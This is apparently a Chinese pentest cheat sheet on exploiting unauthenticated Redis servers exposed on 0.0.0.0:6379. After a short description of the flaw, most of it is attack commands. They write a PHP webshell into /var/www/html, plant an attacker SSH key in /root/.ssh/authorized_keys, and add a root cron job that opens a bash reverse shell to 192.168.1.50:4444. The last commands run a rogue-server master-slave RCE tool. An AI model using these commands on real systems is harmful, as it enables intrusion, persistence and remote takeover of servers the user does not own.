# 未授权访问
Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。
漏洞的产生条件有以下两点：
（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；
（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。
[9548962.html](https://www.cnblogs.com/bmjoker/p/9548962.html)

1.写webshell
```
#设置shell写入的路径
config set dir /var/www/html
#设置写入文件
config set dbfilename payload.php
#设置写入内容
set webshell "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
```
2.写入攻击者公钥

# 本地生成密钥对
```
ssh-keygen -t rsa


# 将公钥写入临时文件
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt

# 写入目标服务器
cat key.txt | redis-cli -h 目标IP -x set ssh_key
redis-cli -h 目标IP
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> SAVE
```
3.计划任务反弹shell
```
# 连接Redis
redis-cli -h 192.168.1.100

# 设置目录
config set dir /var/spool/cron

# 设置文件名（Root用户）
config set dbfilename root

# 写入计划任务（反向Shell）
set xx "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\n\n"

# 保存
save

```
4.主从复制 RCE（Redis 4.x/5.x）
```
# 在攻击机上启动恶意Redis服务器
python3 redis-rogue-server.py --rhost 192.168.1.100 --lhost 192.168.1.50

# 或者使用其他工具
./redis-rogue-server -r 192.168.1.100 -L 192.168.1.50 -f module.so

```